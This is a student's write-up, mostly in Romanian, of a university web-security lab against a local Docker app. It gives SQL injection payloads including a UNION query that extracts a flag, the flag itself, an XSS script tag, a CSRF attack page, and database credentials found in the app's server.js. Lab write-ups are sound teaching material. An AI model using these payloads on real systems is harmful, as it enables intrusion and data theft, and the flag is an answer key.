# Lab 9 - Web Security

## Infrastructura

OpenStack VM sua pe local cu Docker

## Setup

```bash
~$ ssh -L "8080:localhost:8080" -J fep openstack
# ssh -L "8080:localhost:8080" -J <first.lastname>@fep.grid.pub.ro student@10.9.X.Y
```

##  Task 1 - SQLi

```bash
# First, start the MySQL instance in background
$ docker run -d --rm --name mysql ropubisc/lab08-mysql
```

```bash
# Wait until the MySQL server fully starts:
$ docker logs mysql -f 
# Ctrl+C and continue when it says: 'mysqld: ready for connections.'
```

```bash
# Finally, start the sample web server
docker run -it --link mysql:mysql -p 8080:8080 ropubisc/lab08-web-server
```

Din browser: `http://localhost:8080/`

1. La users se introduce `' OR 1 --` sau `' OR 1 #`


## Task 2 - Advanced SQLi

Start the web server from the first task again.

La user se introduce comanda:
```
 'UNION SELECT 1, 2, 3, GROUP_CONCAT(0x7C, flag, 0x7C) FROM flags --
```
 Flag-ul `Flag{adv4nc3dsequeel}`

## Task 3 - Cross-Site Scripting

Dupa login se posteaza un mesaj cu continutul 
```html
<script>alert("XSS!");</script>
```

### Poza
Se posteaza un mesaj cu urmatorul continut sau cu F12 (inspect element) se duplica un post existent si se modifica continutul.
```html
<div style="position: absolute; top: -100px; left: 300px;"> <img src="http://localhost:8080/images/muzzle.png" style="width: 100px; height: auto;"> </div>
```
Se ajusteaza poztia.

## Task 4 - Cross-Site Request Forgery

Se creaza o pagina HTML local

```html
<!DOCTYPE <html>
    <body>
        <form method="post" action="http://localhost:8080/journal/post">
            <p>
                <label for="message">Hacker:</label>
                <input type="hidden" id="message" name="message" value="Hidden mallware">
            </p>
            <p>
              <input type="submit" value="Attack!!!">
            </p>
        </form>
    </body>
</html>
```

Se ruleaza dintr-un browser 
- se cauta unul pe care merge - mie mi-a mers pe Opera, dar nu pe Opera GX sau Chrome
- a mers doar daca serverul si pagina mea 'malitioasa' erau deschise pe acelasi browser

## Task 5 - Server Reconnaissance

Am cautat dupa 
* sitemap.xml - nu are
* robots.txt - are si ne zice de un fisier `server.js`. That's it. :joy:

Undeva prin fisier sunt si credentialele:
```js
var db = mysql.createConnection({
  host     : 'mysql',
  user     : 'guest',
  password : 'secretpasswordlab08-1337',
  database : 'journalapp'
});
db.connect(runServer);
```